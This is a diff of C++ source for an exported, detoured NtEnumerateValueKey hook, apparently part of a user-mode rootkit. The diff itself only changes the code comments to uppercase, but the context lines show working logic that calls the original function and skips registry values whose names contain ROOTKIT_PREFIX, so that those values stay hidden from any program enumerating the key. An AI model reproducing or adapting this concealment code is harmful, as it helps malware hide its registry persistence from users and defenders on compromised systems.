@@ -321,17 +321,17 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntevk(HANDLE key_handle, ULONG i
 	// RESTORE
 	detour::remove_detour(function_pointer, ntevk_og, sizeof(ntevk_og));
 
-	// we need to save indexes not to display same key twice after replacing the hidden ones
+	// WE NEED TO SAVE INDEXES NOT TO DISPLAY SAME KEY TWICE AFTER REPLACING THE HIDDEN ONES
 	thread_local int last_replaced = -1;
 	thread_local HANDLE last_handle = key_handle;
 
-	// we are not iterating over a new keys list
+	// WE ARE NOT ITERATING OVER A NEW KEYS LIST
 	if(last_handle != key_handle) {
 		last_handle  = key_handle;
 		last_replaced = -1;
 	}
 	
-	// update the index to be after the value we replaced hidden keys with
+	// UPDATE THE INDEX TO BE AFTER THE VALUE WE REPLACED HIDDEN KEYS WITH
 	if(index < last_replaced)
 	{
 		index = last_replaced + 1;
@@ -345,10 +345,10 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntevk(HANDLE key_handle, ULONG i
 		// CALL	
 		result = reinterpret_cast<decltype(ntevk)*>(function_pointer)(key_handle, index, key_value_class, key_value_info, length, return_length);
 
-		// something failed or we reached the end of list
+		// SOMETHING FAILED OR WE REACHED THE END OF LIST
 		if(!NT_SUCCESS(result))
 		{
-			// reset the index of last replaced registry value
+			// RESET THE INDEX OF LAST REPLACED REGISTRY VALUE
 			last_replaced = -1;
 			break;
 		}
@@ -363,18 +363,18 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntevk(HANDLE key_handle, ULONG i
 			auto data = static_cast<KEY_VALUE_BASIC_INFORMATION*>(key_value_info);
 			name 	  = std::wstring(data->Name, data->NameLength / sizeof(wchar_t));
 		}
-		else // partial information doesn't contain the name so we dont really care about it
+		else // PARTIAL INFORMATION DOESN'T CONTAIN THE NAME SO WE DONT REALLY CARE ABOUT IT
 			break;
 
-		// if nothing is found we break out of the loop
+		// IF NOTHING IS FOUND WE BREAK OUT OF THE LOOP
 		if (name.find(ROOTKIT_PREFIX) == std::wstring::npos)
 		{
-			// update the index of last replacement
+			// UPDATE THE INDEX OF LAST REPLACEMENT
 			last_replaced = index;
 			break;
 		}
 
-		// else clear the current held information and increase the index to check next value
+		// ELSE CLEAR THE CURRENT HELD INFORMATION AND INCREASE THE INDEX TO CHECK NEXT VALUE
 		std::memset(key_value_info, 0, length);
 		++index;			
 	}
